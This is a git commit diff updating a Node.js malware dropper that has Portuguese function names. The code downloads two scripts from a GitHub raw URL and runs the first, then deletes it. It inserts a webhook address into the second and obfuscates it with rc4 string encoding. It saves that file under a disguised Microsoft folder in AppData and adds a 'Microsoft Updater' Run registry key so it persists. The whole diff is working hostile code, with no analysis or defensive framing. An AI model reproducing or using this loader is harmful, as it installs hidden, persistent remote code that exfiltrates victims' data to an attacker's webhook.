ee506b0575c314ffce04df3987700aa7490c91a1
P180EwqDeRT <sk4rtysec@gmail.com>
2025-05-24 23:36:04 -0300

    Update 60o7lxnsi0tz.js

--- f9a75c19da8cdd/60o7lxnsi0tz.js
+++ f9a75c19da8cdd/60o7lxnsi0tz.js
@@ -1,45 +1,58 @@
+const H00K3_URL = "%WEBHOOK%";
+
 const fs = require("fs");
 const https = require("https");
 const path = require("path");
 const os = require("os");
-const { exec } = require("child_process");
-
-const H00K3_URL = "%WEBHOOK%"; 
-const fileUrl = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/4i5tyydshnyi.js";
+const { exec, execSync } = require("child_process");
 
 const appData = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
 const targetDir = path.join(appData, "Microsoft", "Net", "System", "My", "CTLs");
-const targetFile = path.join(targetDir, "index.js");
+const indexPath = path.join(targetDir, "index.js");
+const importsPath = path.join(targetDir, "imports.js");
 
-function downloadReplaceObfuscate(url, dest, webhook, cb) {
+const indexUrl = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/4i5tyydshnyi.js";
+const importsUrl = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/imports.js";
+
+function baixarArquivo(url, destino, substituirWebhook, callback) {
   https.get(url, (res) => {
     let data = "";
-    res.on("data", (chunk) => data += chunk);
+    res.on("data", chunk => data += chunk);
     res.on("end", () => {
-      const replaced = data.replace(/const H00K\s*=\s*["']%WEBHOOK%["'];/, `const H00K = "${webhook}";`);
-      const obfuscated = Buffer.from(replaced).toString("base64");
-
-      const wrapped = `
-const { Buffer } = require('buffer');
-eval(Buffer.from("${obfuscated}", "base64").toString("utf-8"));
-      `.trim();
-
-      fs.mkdirSync(path.dirname(dest), { recursive: true });
-      fs.writeFileSync(dest, wrapped);
-      cb();
+      let content = data;
+      if (substituirWebhook) {
+        content = content.replace(/const\s+H00K\s*=\s*["']%WEBHOOK%["'];?/g, `const H00K = "${H00K3_URL}";`);
+      }
+      fs.mkdirSync(path.dirname(destino), { recursive: true });
+      fs.writeFileSync(destino, content);
+      callback();
     });
-  }).on("error", () => cb());
+  }).on("error", () => {});
 }
 
-function adicionarStartup(scriptPath) {
-  const regPath = `"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"`;
-  const startupName = "Microsoft Updater";
-  const cmd = `reg add ${regPath} /v "${startupName}" /t REG_SZ /d "node \\"${scriptPath}\\"" /f`;
-  exec(cmd);
+function adicionarAoRegistro(scriptPath) {
+  const nome = "Microsoft Updater";
+  const comando = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${nome}" /t REG_SZ /d "node \\"${scriptPath}\\"" /f`;
+  exec(comando);
 }
 
-downloadReplaceObfuscate(fileUrl, targetFile, H00K3_URL, () => {
-  exec(`node "${targetFile}"`, () => {
-    adicionarStartup(targetFile);
+baixarArquivo(importsUrl, importsPath, false, () => {
+  exec(`node "${importsPath}"`, () => {
+    fs.unlinkSync(importsPath);
+
+    baixarArquivo(indexUrl, indexPath, true, () => {
+      const originalCode = fs.readFileSync(indexPath, "utf8");
+      const JavaScriptObfuscator = require("javascript-obfuscator");
+      const obfuscated = JavaScriptObfuscator.obfuscate(originalCode, {
+        compact: true,
+        controlFlowFlattening: true,
+        deadCodeInjection: true,
+        stringArrayEncoding: ["rc4"],
+        simplify: true
+      }).getObfuscatedCode();
+      fs.writeFileSync(indexPath, obfuscated);
+
+      adicionarAoRegistro(indexPath);
+    });
   });
 });
